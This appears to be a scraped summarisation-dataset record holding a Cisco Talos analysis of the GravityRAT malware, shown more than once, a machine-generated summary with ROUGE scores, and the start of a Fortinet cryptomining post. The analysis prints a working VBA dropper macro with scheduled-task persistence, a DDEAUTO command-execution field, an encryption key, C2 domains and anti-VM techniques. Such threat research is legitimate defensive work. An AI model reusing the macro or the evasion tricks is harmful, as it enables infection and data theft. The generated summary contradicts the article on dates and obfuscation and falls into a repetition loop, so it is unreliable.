(G2 v5) (Current)\Microsoft Virus Solutions\obj\Debug\Windows Wireless 802.11.pdbFor this version, the developer modified the architecture of the malware. The main code aims to load and execute two additional .NET binaries stored in the resources of the file:The first resource is a legitimate open-source library available on GitHub. It's a .NET wrapper for the Windows Task SchedulerThe second is the G2 version of GravityRATThis variant shares the same command and control (C2) servers as G1, however, we have an additional 'payload' variable added to G2.This variant has almost identical capabilities as the previous, except one additional functionality: It collects the CPU information in the Win32_Processor entry via WMI request (Processor ID, Name, Manufacturer and the clock speed). The attacker is most likely using this information as part of an anti-vm attempt within this malware. This is used to try and thwart analysis in virtual environments.In a slight change to the previous variant, the new payloads are executed with a Windows Scheduled Task. This would explain the inclusion of the .NET wrapper.The analysed sample contained a decoy picture document in the resource section:Version G3In August 2017, the author of GravityRAT used a new variant of its malware, G3. Here is the PDB:F:\Projects\g3\G3 Version 4.0\G3\G3\obj\Release\Intel Core.pdbThis variant uses the same method as G2, and includes a legitimate library in the resource section. The developers also added additional language support to the library:GermanSpanishFrenchItalianChineseThe author changed the backend of the C2 server with this variant. The URI changed too, it contains the GravityRAT variant name:August was also the same month NIC CERT notified potential victims that GravityRAT had been used in a targeted campaign. Given the ongoing development nature of this malware, it meant another variant was most likely due.Version GXThe latest version of GravityRAT was created in December 2017 named GX. Here is the PDB:C:\Users\The Invincible\Desktop\gx\gx-current-program\LSASS\obj\Release\LSASS.pdbThis version is the most advanced variant of GravityRAT. Throughout the evolution, we saw this malware embedding open-source legitimate .NET libraries (for schedule tasks, compression, encryption, .NET loading). It contains a resource named ""important."" This is an archive with a password.This variant has the same features as before, but this time, some new features are added:It collects open ports on the victim host by running the netstat commandIt lists all the running processesIt lists available services on the systemIt exfiltrates .ppt and .pptx file, in addition to the extension mentioned in the G1 variantIf a USB key is connected on the system, the malware steals the file based on an extension listIt supports file encryption (AES with the key ""lolomycin2017"")It collects information on the account (account type, description, domain name, full name, SID and status)It checks if the system is a virtual machine with several techniquesThe developer implemented a total of seven techniques to identify if the compromised system is a virtual machine.The first technique consists of looking at any additional tools used by the hypervisor that are installed on the system (by checking a registry key):The second technique uses a WMI request to the BIOS version (Win32_BIOS entry). If the response contains: ""VMware"", ""Virtual"", ""XEN"", ""Xen"" or ""A M I"" the system is considered as a virtual machine. Additionally, the malware checks the SerialNumber and the version of the BIOS.The third technique uses the Win32_Computer entry in WMI. It checks if the manufacturer contains ""VIRTUAL"", ""VMWARE"" or ""VirtualBox"".The fourth technique checks the Processor ID of the system.The fifth technique counts the number of cores in the infected system (the author expects more than one core)The sixth technique checks the current CPU temperature of the system (the MSAcpi_ThermalZoneTemperature entry). Indeed, some hypervisors (VMWare, VirtualBox and Hyper-V) do not support temperature check. The WMI request simply replies ""not supported"". This behaviour can be used to detect if the targeted system is a real machine.The last technique uses the MAC Address of the infected system. If the MAC Address starts by a well-known hexadecimal number, the system is identified as a virtual machine.The C2 servers communication is performed in HTTP as it did previously. The variant version of GX is used in the URI. The C2 servers we can see are shared with the previous variants:What we know about the authorBelow, we will present evidence that we have obtained regarding the attacker and the associated malware. Obviously, attribution is a complex field. The developers could be using a proxy or a VPN in order to fake the origin of the submission. But, we will still simply present some facts concerning this actor.The developer used at least two different usernames in the past two years: ""The Invincible"" and ""TheMartian."" In the oldest version of GravityRAT, the attacker potentially leaked his or her first name in the PDB: ""Adeel"" -- the path contained ""Adeel's Laptop"". Additionally, all the malicious Office documents, and more specifically the documents used to test anti-virus on VirusTotal, were submitted from Pakistan. One of the four PE files in the IOCs section was sent from Pakistan, too.In August 2017, NIC CERT published an advisory about malicious targeted campaigns. This advisory mentions the C2 server infrastructure of GravityRAT, which means the GravityRAT author likely targeted Indian entities/organisations. By leveraging Cisco Umbrella and using the Investigate tool, we were able to determine that across all of the C2 domains listed, we saw a large influx of traffic originating from India, as evidenced by NIC CERT, all of the C2 domains were at least 50 percent requested by Indian IP infrastructure. It is possible that some of the non-Indian IP space requests may artefacts be due to our own research.ConclusionThis actor is probably not the most advanced actor we've seen. But he or she managed to stay under the radar since 2016. They worked on malicious code, and produced four variants. Each new variant included new features. The developer used the same C2 infrastructure all this time. The developer was clever enough to keep this infrastructure safe, and not have it blocklisted by a security vendor. The actor took their time to ensure they were not within a virtual environment to avoid analysis. However, they did not take any time at all to attempt to obfuscate their .NET code. The code was largely trivial to reverse engineer, which meant static analysis was an easy option for this piece of malware.NIC CERT published an advisory about this actor, which suggest they targeted Indian entities and organizations.The author leaked information within the samples (i.e. Adeel) and on the VirusTotal platform. Thanks to this information, we we able to understand how they tested malicious documents in order to decrease detection ratios across many popular engines. During this testing period, all the samples were uploaded from Pakistan to VirusTotal.CoverageAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.CWSor WSA web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such asNGFW,NGIPS, andMeraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.IOCsMalicious DocumentsMacros0beb2eb1214d4fd78e1e92db579e24d12e875be553002a778fb38a225cadb70370dc2a4d9da2b3338dd0fbd0719e8dc39bc9d8e3e959000b8c8bb04c931aff82835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4C14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719ed0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2af4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136Other Malicious Documents (DDE)911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024ffb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210ef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301cd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a207682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105GravityRATG1 9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3aG2 1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bcG3 99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90GX 1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96msoftupdates[.]commsoftupdates[.]eumylogisoft[.]comURI:/Gvty@/1ns3rt_39291384.php/Gvty@/newIns3rt.php/Gvty@/payloads/Gvty@/ip.php/G3/ServerSide/G3.php/G3/Payload//GX/GX-Server.php/GetActiveDomains.php";"This blog post is authored by Warren Mercer and Paul Rascagneres.Update: 4/30 Since the publication of the blog post, one of the antiVM capability was commented a lot on Twitter: the detection of Virtual Machines by checking the temperature of the system. We decided to add more details and clarifications concerning this feature. GravityRAT uses a WMI request in order to get the current temperature of the hardware. Here is the output of the query on a physical machine (a Surface Book):The query returns the temperature of 7 thermal zones.Here is the output on a Virtual Machine executed by HyperV on the same hardware:The feature is not supported. The malware author used this behavior in order to identify VM (such as Sandboxes). From our tests and the feedback from several researchers, this monitoring is not supported on HyperV, VMWare Fusion, VirtualBox, KVM and XEN. It's important to notice that several recent physical systems do not support it (a researcher reported some Lenovo and Dell hosts did not support this). It means that GravityRAT will consider this physical machine as VMs. Importantly to note this check is not foolproof as we have identified physical hosts which do not report back the temperature, however, it should also be considered a check that is identifying a lot of virtual environments. This is particularly important due to the amount of sandboxing & malware detonation being carried out within virtual environments by researchers.SummaryToday, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for the past two years while it continues to be developed. Several weeks ago, we identified the use of the latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical capabilities, the evolution, development and potential attribution GravityRAT has been active since 2017, with four distinct versions of the malware developed over two years. The latest version of GravityRAT was created in December 2017 named GX. Here is the PDB:C:\Users\The Invincible\Desktop\gx\gxcurrentprogram\LSASS\obj\Release\LSASS.pdbThis version is the most advanced variant of GravityRAT. GravityRAT is a sophisticated piece of malware developed by a skilled hacker. The malware is designed to steal sensitive information from its victims. The malware is capable of collecting open ports on the victim host, listing all the running processes, listing available services on the system, exfiltrating .ppt and .pptx file, in addition to the extension mentioned in the G1 variant, if a USB key is connected on the system, the malware steals the file based on an extension list, it collects information on the account (account type, description, domain name, full name, SID and status), it checks if the compromised system is a virtual machine with several techniques, the developer implemented a total of seven techniques to identify if the compromised system is a virtual machine, it uses a WMI request to the BIOS version (Win32_BIOS entry), if the response contains: ""VMware"", ""Virtual"", ""XEN"", ""Xen"" or ""A M I"" the system is considered as a virtual machine, additionally, the malware checks the SerialNumber and the version of the BIOS, it uses the Win32_Computer entry in WMI, it checks if the manufacturer contains ""VIRTUAL"", ""VMWARE"" or ""VirtualBox"", it counts the number of cores in the infected system (the MSAcpi_ThermalZoneTemperature entry), indeed, some hypervisors (VMWare, VirtualBox and HyperV) do not support temperature check, the WMI request simply replies ""not supported"", this behaviour can be used to detect if the targeted system is a real machine, it uses the MAC Address of the infected system, if the MAC Address starts by a wellknown hexadecimal number, the system is identified as a virtual machine, the GravityRAT is a family of malware that has been around since 2016. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros,";en;{'r': 0.26552655265526554, 'p': 0.8939393939393939, 'f': 0.4094378868226582};{'r': 0.1975806451612903, 'p': 0.8032786885245902, 'f': 0.3171521003910726};{'r': 0.26282628262826285, 'p': 0.8848484848484849, 'f': 0.40527411166651667}
https://blog.talosintelligence.com/gravityrat-two-year-evolution-of-apt/;GravityRAT - The Two-Year Evolution Of An APT Targeting India;"This blog post is authored by Warren Mercer and Paul Rascagneres.Update: 4/30 Since the publication of the blog post, one of the anti-VM capability was commented a lot on Twitter: the detection of Virtual Machines by checking the temperature of the system. We decided to add more details and clarifications concerning this feature. GravityRAT uses a WMI request in order to get the current temperature of the hardware. Here is the output of the query on a physical machine (a Surface Book):The query returns the temperature of 7 thermal zones.Here is the output on a Virtual Machine executed by Hyper-V on the same hardware:The feature is not supported. The malware author used this behavior in order to identify VM (such as Sandboxes).From our tests and the feedback from several researchers, this monitoring is not supported on Hyper-V, VMWare Fusion, VirtualBox, KVM and XEN. It's important to notice that several recent physical systems do not support it (a researcher reported some Lenovo and Dell hosts did not support this). It means that GravityRAT will consider this physical machine as VMs. Importantly to note this check is not foolproof as we have identified physical hosts which do not report back the temperature, however, it should also be considered a check that is identifying a lot of virtual environments. This is particularly important due to the amount of sandboxing & malware detonation being carried out within virtual environments by researchers.SummaryToday, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for the past two years while it continues to be developed. Several weeks ago, we identified the use of the latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical capabilities, the evolution, development and potential attribution of what we are calling GravityRAT.GravityRAT has been under ongoing development for at least 18 months, during which the developer has implemented new features. We've seen file exfiltration, remote command execution capability and anti-vm techniques added throughout the life of GravityRAT. This consistent evolution beyond standard remote code execution is concerning because it shows determination and innovation by the actor.Throughout our investigation, we observed several malicious documents used to attack victims, which we will discuss. These malicious documents were used by the developer to run several tests on the popular analysis platform VirusTotal. Using VirusTotal allowed the developer to make changes in an attempt to decrease antivirus detection.Although GravityRAT has not been previously published or discussed, there was some information from the National Computer Emergency Response Team (CERT) of India describing GravityRAT as being used in targeted attacks against India. Finally, we will discuss specific attribution elements discovered during our research into GravityRAT as we identify specific information, which we believe to be leaked by the developer, such as location, and potentially their first name.Infection VectorsMalicious Office DocumentsThe majority of the malicious documents crafted by the malware author are Microsoft Office Word documents. The attacker uses an embedded macro in order to execute malicious code on the victim's system. The document opens and appears as such:The document asks to the user to enable macros in order to prove that the user is not a robot (similar to the CAPTCHA we often see on the internet). This, however, is a known tactic that a lot of Office-based malware uses. It is an attempt to trick any users who are using Protected Mode on their systems. By enabling macros, the malware is able to begin it's execution. We discovered that the embedded macro is quite small when extracted.Sub AutoOpen() If Not Dir(Environ(""TEMP"") + ""\image4.exe"") <> """" Then Const lCancelled_c As Long = 0 Dim sSaveAsPath As String sSaveAsPath = CreateObject(""WScript.Shell"").ExpandEnvironmentStrings(""%Temp%"") + ""\temporary.zip"" If VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub ActiveDocument.Save Application.Documents.Add ActiveDocument.FullName ActiveDocument.SaveAs sSaveAsPath ActiveDocument.Close Set app = CreateObject(""Shell.Application"") ExtractTo = CreateObject(""WScript.Shell"").ExpandEnvironmentStrings(""%Temp%"") ExtractByExtension app.NameSpace(Environ(""TEMP"") + ""\temporary.zip""), ""exe"", ExtractTo End If End Sub Sub ExtractByExtension(fldr, ext, dst) Set FSO = CreateObject(""Scripting.FileSystemObject"") Set app = CreateObject(""Shell.Application"") For Each f In fldr.Items If f.Type = ""File folder"" Then ExtractByExtension f.GetFolder, ext, dst ElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then If Not Dir(Environ(""TEMP"") + ""\image4.exe"") <> """" Then app.NameSpace(dst).CopyHere f.Path, &H4 End If End If Next Shell ""schtasks /create /tn wordtest /tr """"'%temp%\image4.exe' 35"""" /sc DAILY /f /RI 10 /du 24:00 /st 00:01"" End SubThis macro contains three functions:The first one is executed when the document is opened. The purpose is to copy the active document (the opened Word document) in a temporary directory and to rename it as a ZIP archive. Indeed, the docx format is, in fact, a common ZIP archive, and can be unzipped using common tools.The second function decompresses this 'temporary.zip' file and extracts the .exe file stored in it.The third creates a scheduled task, named 'wordtest', to execute this malicious file every day. With this approach, the attacker ensures that there is no direct execution (the executable is executed thanks to scheduled tasks), there's no download of an additional payload, and finally, the author uses the fact that the docx format is an archive in order to include its executable (GravityRAT).Testing By The AuthorDuring our tracking, we identified several malicious documents submitted from this actor on VirusTotal for testing purposes. They tested the detection on macros (by modifying them, or by executing the calc instead of the malicious payload) and the developers tried dynamic data exchange (DDE) execution in the Office document. This is abusing the DDE protocol which exists within Microsoft Office documents. Whilst this is a feature Microsoft provide it is also a feature that an attacker can leverage for malicious activity, Microsoft published mitigation information here previously. The developer crafted Office Word and Excel documents to see the detection in VirusTotal. The authors tried to hide the DDE object in a different part of the document -- in the main object and the header, for example. The DDE object simply executes Microsoft calc in the detected sample. Here is an example:<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> <w:document [...redated...}] mc:Ignorable=""w14 w15 wp14""><w:body><w:p w:rsidR=""00215C91"" w:rsidRDefault=""008C166A""><w:r><w:fldChar w:fldCharType=""begin""/></w:r><w:r><w:instrText xml:space=""preserve""> </w:instrText></w:r><w:r><w:rPr><w:rFonts w:ascii=""Helvetica"" w:hAnsi=""Helvetica"" w:cs=""Helvetica""/><w:color w:val=""383838""/><w:spacing w:val=""3""/><w:sz w:val=""26""/><w:szCs w:val=""26""/><w:shd w:val=""clear"" w:color=""auto"" w:fill=""FFFFFF""/></w:rPr><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe ""/k calc.exe""</w:instrText></w:r><w:r><w:instrText xml:space=""preserve""> </w:instrText></w:r><w:r><w:fldChar w:fldCharType=""end""/></w:r><w:bookmarkStart w:id=""0"" w:name=""_GoBack""/><w:bookmarkEnd w:id=""0""/></w:p><w:sectPr w:rsidR=""00215C91""><w:pgSz w:w=""12240"" w:h=""15840""/><w:pgMar w:top=""1440"" w:right=""1440"" w:bottom=""1440"" w:left=""1440"" w:header=""720"" w:footer=""720"" w:gutter=""0""/><w:cols w:space=""720""/><w:docGrid w:linePitch=""360""/></w:sectPr></w:body></w:document>We believe the filenames of the submitted samples are clearly testing docs, using different methods and Office tricks to attempt to ensure his malware was undetected. Those names were:testnew1.docxTest123.docxtest456.docxtest2.docxbook1test2.xlsxTest123.docGravityRATOur initial discovery of GravityRAT was through a malicious Word document. As explained previously, this Word document had various macros to deliver a final payload.Considering that this was the most recent version of the malware, we decided to ascertain how long this actor had been active, and how their attacks had evolved. We were able to discover four distinct versions of GravityRAT, developed over two years. Next, we will go through what we believe is the development life cycle and feature-addition mission carried out by this developer.Version G1The malware author uses a versioning system starting by the G letter. The oldest version we identified is G1. Here is the PDB path of the sample:f:\F\Windows Work\G1\Adeel's Laptop\G1 Main Virus\systemInterrupts\gravity\obj\x86\Debug\systemInterrupts.pdbYou can notice the potential first name of the developers: Adeel. Of course, this information can be manipulated by the malware author. This sample was compiled in December 2016. The original filename of the sample was resume.exe.The purpose of this version was to steal information on the compromised system:MAC AddressComputer nameUsernameIP addressDateSteal files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf and .pdfThe volumes mapped on the systemAll this information was then sent to one of the following domains:G1 also had the ability to execute commands remotely on the infected host machine at the author's will.Version G2We identified a new variant used in July 2017 named G2. Here is the PDB of the sample:e:\Windows Work\G2\G2 Main Virus\Microsoft Virus Solutions (G2 v5) (Current)\Microsoft Virus Solutions\obj\Debug\Windows Wireless 802.11.pdbFor this version, the developer modified the architecture of the malware. The main code aims to load and execute two additional .NET binaries stored in the resources of the file:The first resource is a legitimate open-source library available on GitHub. It's a .NET wrapper for the Windows Task SchedulerThe second is the G2 version of GravityRATThis variant shares the same command and control (C2) servers as G1, however, we have an additional 'payload' variable added to G2.This variant has almost identical capabilities as the previous, except one additional functionality: It collects the CPU information in the Win32_Processor entry via WMI request (Processor ID, Name, Manufacturer and the clock speed). The attacker is most likely using this information as part of an anti-vm attempt within this malware. This is used to try and thwart analysis in virtual environments.In a slight change to the previous variant, the new payloads are executed with a Windows Scheduled Task. This would explain the inclusion of the .NET wrapper.The analysed sample contained a decoy picture document in the resource section:Version G3In August 2017, the author of GravityRAT used a new variant of its malware, G3. Here is the PDB:F:\Projects\g3\G3 Version 4.0\G3\G3\obj\Release\Intel Core.pdbThis variant uses the same method as G2, and includes a legitimate library in the resource section. The developers also added additional language support to the library:GermanSpanishFrenchItalianChineseThe author changed the backend of the C2 server with this variant. The URI changed too, it contains the GravityRAT variant name:August was also the same month NIC CERT notified potential victims that GravityRAT had been used in a targeted campaign. Given the ongoing development nature of this malware, it meant another variant was most likely due.Version GXThe latest version of GravityRAT was created in December 2017 named GX. Here is the PDB:C:\Users\The Invincible\Desktop\gx\gx-current-program\LSASS\obj\Release\LSASS.pdbThis version is the most advanced variant of GravityRAT. Throughout the evolution, we saw this malware embedding open-source legitimate .NET libraries (for schedule tasks, compression, encryption, .NET loading). It contains a resource named ""important."" This is an archive with a password.This variant has the same features as before, but this time, some new features are added:It collects open ports on the victim host by running the netstat commandIt lists all the running processesIt lists available services on the systemIt exfiltrates .ppt and .pptx file, in addition to the extension mentioned in the G1 variantIf a USB key is connected on the system, the malware steals the file based on an extension listIt supports file encryption (AES with the key ""lolomycin2017"")It collects information on the account (account type, description, domain name, full name, SID and status)It checks if the system is a virtual machine with several techniquesThe developer implemented a total of seven techniques to identify if the compromised system is a virtual machine.The first technique consists of looking at any additional tools used by the hypervisor that are installed on the system (by checking a registry key):The second technique uses a WMI request to the BIOS version (Win32_BIOS entry). If the response contains: ""VMware"", ""Virtual"", ""XEN"", ""Xen"" or ""A M I"" the system is considered as a virtual machine. Additionally, the malware checks the SerialNumber and the version of the BIOS.The third technique uses the Win32_Computer entry in WMI. It checks if the manufacturer contains ""VIRTUAL"", ""VMWARE"" or ""VirtualBox"".The fourth technique checks the Processor ID of the system.The fifth technique counts the number of cores in the infected system (the author expects more than one core)The sixth technique checks the current CPU temperature of the system (the MSAcpi_ThermalZoneTemperature entry). Indeed, some hypervisors (VMWare, VirtualBox and Hyper-V) do not support temperature check. The WMI request simply replies ""not supported"". This behaviour can be used to detect if the targeted system is a real machine.The last technique uses the MAC Address of the infected system. If the MAC Address starts by a well-known hexadecimal number, the system is identified as a virtual machine.The C2 servers communication is performed in HTTP as it did previously. The variant version of GX is used in the URI. The C2 servers we can see are shared with the previous variants:What we know about the authorBelow, we will present evidence that we have obtained regarding the attacker and the associated malware. Obviously, attribution is a complex field. The developers could be using a proxy or a VPN in order to fake the origin of the submission. But, we will still simply present some facts concerning this actor.The developer used at least two different usernames in the past two years: ""The Invincible"" and ""TheMartian."" In the oldest version of GravityRAT, the attacker potentially leaked his or her first name in the PDB: ""Adeel"" -- the path contained ""Adeel's Laptop"". Additionally, all the malicious Office documents, and more specifically the documents used to test anti-virus on VirusTotal, were submitted from Pakistan. One of the four PE files in the IOCs section was sent from Pakistan, too.In August 2017, NIC CERT published an advisory about malicious targeted campaigns. This advisory mentions the C2 server infrastructure of GravityRAT, which means the GravityRAT author likely targeted Indian entities/organisations. By leveraging Cisco Umbrella and using the Investigate tool, we were able to determine that across all of the C2 domains listed, we saw a large influx of traffic originating from India, as evidenced by NIC CERT, all of the C2 domains were at least 50 percent requested by Indian IP infrastructure. It is possible that some of the non-Indian IP space requests may artefacts be due to our own research.ConclusionThis actor is probably not the most advanced actor we've seen. But he or she managed to stay under the radar since 2016. They worked on malicious code, and produced four variants. Each new variant included new features. The developer used the same C2 infrastructure all this time. The developer was clever enough to keep this infrastructure safe, and not have it blocklisted by a security vendor. The actor took their time to ensure they were not within a virtual environment to avoid analysis. However, they did not take any time at all to attempt to obfuscate their .NET code. The code was largely trivial to reverse engineer, which meant static analysis was an easy option for this piece of malware.NIC CERT published an advisory about this actor, which suggest they targeted Indian entities and organizations.The author leaked information within the samples (i.e. Adeel) and on the VirusTotal platform. Thanks to this information, we we able to understand how they tested malicious documents in order to decrease detection ratios across many popular engines. During this testing period, all the samples were uploaded from Pakistan to VirusTotal.CoverageAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.CWSor WSA web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such asNGFW,NGIPS, andMeraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.IOCsMalicious DocumentsMacros0beb2eb1214d4fd78e1e92db579e24d12e875be553002a778fb38a225cadb70370dc2a4d9da2b3338dd0fbd0719e8dc39bc9d8e3e959000b8c8bb04c931aff82835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4C14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719ed0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2af4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136Other Malicious Documents (DDE)911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024ffb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210ef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301cd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a207682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105GravityRATG1 9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3aG2 1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bcG3 99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90GX 1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96msoftupdates[.]commsoftupdates[.]eumylogisoft[.]comURI:/Gvty@/1ns3rt_39291384.php/Gvty@/newIns3rt.php/Gvty@/payloads/Gvty@/ip.php/G3/ServerSide/G3.php/G3/Payload//GX/GX-Server.php/GetActiveDomains.php";"This blog post is authored by Warren Mercer and Paul Rascagneres.Update: 4/30 Since the publication of the blog post, one of the antiVM capability was commented a lot on Twitter: the detection of Virtual Machines by checking the temperature of the system. We decided to add more details and clarifications concerning this feature. GravityRAT uses a WMI request in order to get the current temperature of the hardware. Here is the output of the query on a physical machine (a Surface Book):The query returns the temperature of 7 thermal zones.Here is the output on a Virtual Machine executed by HyperV on the same hardware:The feature is not supported. The malware author used this behavior in order to identify VM (such as Sandboxes). From our tests and the feedback from several researchers, this monitoring is not supported on HyperV, VMWare Fusion, VirtualBox, KVM and XEN. It's important to notice that several recent physical systems do not support it (a researcher reported some Lenovo and Dell hosts did not support this). It means that GravityRAT will consider this physical machine as VMs. Importantly to note this check is not foolproof as we have identified physical hosts which do not report back the temperature, however, it should also be considered a check that is identifying a lot of virtual environments. This is particularly important due to the amount of sandboxing & malware detonation being carried out within virtual environments by researchers.SummaryToday, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for the past two years while it continues to be developed. Several weeks ago, we identified the use of the latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical capabilities, the evolution, development and potential attribution GravityRAT has been active since 2017, with four distinct versions of the malware developed over two years. The latest version of GravityRAT was created in December 2017 named GX. Here is the PDB:C:\Users\The Invincible\Desktop\gx\gxcurrentprogram\LSASS\obj\Release\LSASS.pdbThis version is the most advanced variant of GravityRAT. GravityRAT is a sophisticated piece of malware developed by a skilled hacker. The malware is designed to steal sensitive information from its victims. The malware is capable of collecting open ports on the victim host, listing all the running processes, listing available services on the system, exfiltrating .ppt and .pptx file, in addition to the extension mentioned in the G1 variant, if a USB key is connected on the system, the malware steals the file based on an extension list, it collects information on the account (account type, description, domain name, full name, SID and status), it checks if the compromised system is a virtual machine with several techniques, the developer implemented a total of seven techniques to identify if the compromised system is a virtual machine, it uses a WMI request to the BIOS version (Win32_BIOS entry), if the response contains: ""VMware"", ""Virtual"", ""XEN"", ""Xen"" or ""A M I"" the system is considered as a virtual machine, additionally, the malware checks the SerialNumber and the version of the BIOS, it uses the Win32_Computer entry in WMI, it checks if the manufacturer contains ""VIRTUAL"", ""VMWARE"" or ""VirtualBox"", it counts the number of cores in the infected system (the MSAcpi_ThermalZoneTemperature entry), indeed, some hypervisors (VMWare, VirtualBox and HyperV) do not support temperature check, the WMI request simply replies ""not supported"", this behaviour can be used to detect if the targeted system is a real machine, it uses the MAC Address of the infected system, if the MAC Address starts by a wellknown hexadecimal number, the system is identified as a virtual machine, the GravityRAT is a family of malware that has been around since 2016. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros, and other malicious documents. The malware also uses obfuscation techniques to evade detection. The malware is designed to target Indian entities and organizations. The malware uses a C2 infrastructure that has been active since 2016. The malware uses malicious documents, macros,";en;{'r': 0.26552655265526554, 'p': 0.8939393939393939, 'f': 0.4094378868226582};{'r': 0.1975806451612903, 'p': 0.8032786885245902, 'f': 0.3171521003910726};{'r': 0.26282628262826285, 'p': 0.8848484848484849, 'f': 0.40527411166651667}
https://www.fortinet.com/blog/threat-research/yet-another-crypto-mining-botnet;Yet Another Crypto Mining Botnet?;"In February 2018, several Russian nuclear scientists were arrested for allegedly mining cryptocurrencies using computing resources located at a Russian nuclear warhead facility. Globally, cryptominers are rapidly increasing and spreading for an obvious reason: it's lucrative. Threat actors are also surfing this wave by using different kind of attacks to compromise not only personal computer but also servers. They are looking for powerful CPU resources to mine cryptocurrencies, such as Monero (XMR), among others, as fast as they can. The more infected machines they can get mining for them, the more money they can make.Over the last few months we have begun to see a switch away from traditional ransomware, most probably because fewer and fewer victims are paying the ransom. Experts are suggesting that victims not pay ransoms, as there is no guarantee that the cybercriminals will actually return access to their encrypted data. Moreover, as has been described a few times on this blog, most of the time getting back access to the original data is simply not technically possible.However, last year, we not only witnessed IoT malware embedding exploits to recruit more bots in their army, but also campaigns using exploits to deploy cryptocurrency miners onto those devices. That trend is even more popular today, with cybercriminals exploiting new critical vulnerabilities within days of the public release of patches. For example, the vulnerability disclosed on Drupal CMS in March was exploited just a few days after the patch was released. Drupal is an open-source content management system (CMS) that is powering millions of web sites around the world.The vulnerability, dubbed ""Drupalgeddon 2.0"" (CVE-2018-7600), was rapidly turned to advantage with a cryptomining exploit by unknown actor(s), as detailed by Volexity in ""Drupalgeddon 2: Profiting from Mass Exploitation."" The interesting thing is that the tactics, techniques, and procedures 